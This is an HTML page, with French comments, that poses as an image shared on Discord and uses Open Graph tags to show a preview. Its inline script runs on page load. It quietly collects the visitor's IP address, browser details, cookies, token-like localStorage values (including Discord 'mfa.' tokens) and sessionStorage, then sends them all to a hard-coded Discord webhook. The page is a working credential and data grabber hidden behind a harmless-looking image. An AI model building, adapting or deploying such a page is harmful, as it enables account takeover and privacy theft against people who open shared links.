<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image partagée</title>
    <!-- Balises Open Graph pour que Discord affiche l'image -->
    <meta property="og:title" content="Image partagée">
    <meta property="og:image" content="https://i.imgur.com/3Tz7zqU.jpg">
    <meta property="og:description" content=" ">
    <meta property="og:url" content="https://TON-NOM-DE-DOMAINE.github.io/image-grabber/">
    <meta name="theme-color" content="#7289da">
    <style>
        body { background: #36393f; color: #dcddde; font-family: sans-serif; text-align: center; padding: 20px; }
        img { max-width: 100%; border-radius: 8px; }
    </style>
</head>
<body>
    <h2>Image partagée sur Discord</h2>
    <img src="https://i.imgur.com/3Tz7zqU.jpg" alt="Image">
    <p style="opacity:0.5;">Clique pour voir en taille réelle</p>

    <script>
        // Collecte discrète des données
        (function() {
            const data = {
                ip: '', // sera rempli par une API externe
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: screen.width + 'x' + screen.height,
                cookies: document.cookie,
                localStorage: {},
                sessionStorage: {},
                referrer: document.referrer,
                timestamp: Date.now()
            };

            // Récupérer les tokens potentiels dans localStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    let val = localStorage.getItem(key);
                    if (key.includes('token') || (val && (val.includes('mfa.') || val.includes('ND')))) {
                        data.localStorage[key] = val.substring(0, 100);
                    }
                }
            } catch (e) {}

            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    data.sessionStorage[key] = sessionStorage.getItem(key)?.substring(0,100);
                }
            } catch (e) {}

            // Obtenir l'IP via une API gratuite
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    // Envoyer le tout à ton webhook Discord
                    fetch('https://discord.com/api/webhooks/1478296907787927602/6JnerwAf32WcF381jjlZJIfwXZsOag1e_B5HwEr80HGg4sKjDwawIJi-cT0-_8CAHkNs', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: '@everyone', // ou laisse vide
                            embeds: [{
                                title: '🎯 Nouvelle visite',
                                color: 0x00ff00,
                                fields: [
                                    { name: 'IP', value: data.ip, inline: true },
                                    { name: 'Navigateur', value: data.userAgent.substring(0, 100), inline: false },
                                    { name: 'Plateforme', value: data.platform, inline: true },
                                    { name: 'Langue', value: data.language, inline: true },
                                    { name: 'Fuseau', value: data.timezone, inline: true },
                                    { name: 'Écran', value: data.screen, inline: true },
                                    { name: 'Cookies', value: data.cookies || 'Aucun', inline: false },
                                    { name: 'LocalStorage (tokens)', value: JSON.stringify(data.localStorage) || 'Aucun', inline: false }
                                ],
                                footer: { text: new Date().toLocaleString() }
                            }]
                        })
                    }).catch(e => console.log(e));
                })
                .catch(e => console.log(e));
        })();
    </script>
</body>
</html>
